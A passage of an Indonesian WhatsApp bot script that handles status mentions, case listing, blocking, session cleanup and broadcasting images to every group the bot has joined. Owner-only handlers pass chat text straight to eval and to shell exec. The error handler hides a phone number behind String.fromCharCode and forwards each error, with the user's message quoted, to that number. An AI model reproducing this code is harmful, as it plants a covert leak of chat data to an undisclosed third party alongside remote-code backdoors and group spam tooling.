            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await Rulzz.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: Rulzz.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await Rulzz.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

case "listcase": {
  const filePath = path.join(__dirname, "RulzXD.js")
  if (!fs.existsSync(filePath)) return m.reply("❌ File `RulzXD.js` tidak ditemukan.")

  const data = fs.readFileSync(filePath, "utf8")
  const regex = /case\s+"([^"]+)"/g
  const hasil = [...data.matchAll(regex)].map(match => match[1])

  if (hasil.length === 0) return m.reply("❌ Tidak ada case yang ditemukan di RulzXD.js.")

  let teks = `📂 *List Semua Case di RulzXD.js (${hasil.length})*\n\n`
  teks += hasil.map((v, i) => `${i + 1}. ${v}`).join("\n")
  teks += `\n\n📌 Gunakan *.menu <nama_case>* untuk melihat detail (jika tersedia).`

  await Rulzz.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "getcase": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply("❌ Contoh: .getcase spamcall")

  const filePath = path.join(__dirname, "RulzXD.js")
  if (!fs.existsSync(filePath)) return m.reply("❌ File `RulzXD.js` tidak ditemukan.")

  const data = fs.readFileSync(filePath, "utf8")
  const regex = new RegExp(`case\\s+"${text}"\\s*:\\s*{([\\s\\S]*?)break`, "i")
  const match = data.match(regex)

  if (!match) return m.reply(`❌ Case "${text}" tidak ditemukan di RulzXD.js.`)

  let hasil = match[0].trim()
  if (hasil.length > 4000) {
    // Jika terlalu panjang, kirim sebagai file .txt
    const tempFile = path.join(__dirname, `${text}.txt`)
    fs.writeFileSync(tempFile, hasil)
    await Rulzz.sendMessage(m.chat, {
      document: fs.readFileSync(tempFile),
      fileName: `${text}.txt`,
      mimetype: "text/plain",
    }, { quoted: m })
    fs.unlinkSync(tempFile)
  } else {
    await Rulzz.sendMessage(m.chat, { text: "```" + hasil + "```" }, { quoted: m })
  }
}
break

case "unblock": case "unblok": {
    if (!isCreator) return Reply(global.mess.owner)
    if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
    const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
    await Rulzz.updateBlockStatus(mem, "unblock");
    if (m.isGroup) Rulzz.sendMessage(m.chat, {text: `Berhasil membuka memblokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

case "block": case "blokir": case "blok": {
    if (!isCreator) return Reply(global.mess.owner)
    if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
    const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
    await Rulzz.updateBlockStatus(mem, "block");
    if (m.isGroup) Rulzz.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

case "clearsession": case "boost": case "clsesi": case "clearsesi": {
    if (!isCreator) return Reply(global.mess.owner)
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
    const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
    for (const i of dirsesi) await fs.unlinkSync("./session/" + i)
    for (const u of dirsampah) await fs.unlinkSync("./library/database/sampah/" + u)
    m.reply(`*Berhasil membersihkan sampah ✅*\n*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

case "sendtesti": case "testi": {
    if (!isCreator) return Reply(global.mess.owner)
    if (!text) return m.reply(example("teks dengan mengirim foto"))
    if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
    const allgrup = await Rulzz.groupFetchAllParticipating()
    const res = Object.keys(allgrup)
    let count = 0
    const teks = text
    const jid = m.chat
    const rest = await Rulzz.downloadAndSaveMediaMessage(qmsg)
    await m.reply(`Memproses pengiriman *testimoni* ke dalam channel & ${res.length} grup chat`)
    await Rulzz.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
    for (let i of res) {
      if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
      try {
        await Rulzz.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
        count += 1
      } catch {}
      await sleep(global.delayJpm)
    }
    await fs.unlinkSync(rest)
    await Rulzz.sendMessage(jid, {text: `Berhasil mengirim *testimoni* ke dalam channel & ${count} grup chat`}, {quoted: m})
}
break

//===============================================
// [ END ] BATAS EDIT & PENAMBAHAN FITUR
// JANGAN OTAK ATIK BAGIAN INI SAMPAI BAWAH JIKA TIDAK MAU ERROR!!

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text?.toLowerCase() === "bot") {
  m.reply("Bot Online ✅")
}

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 49, 51, 51, 50, 50, 54, 50, 48, 54)
Rulzz.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});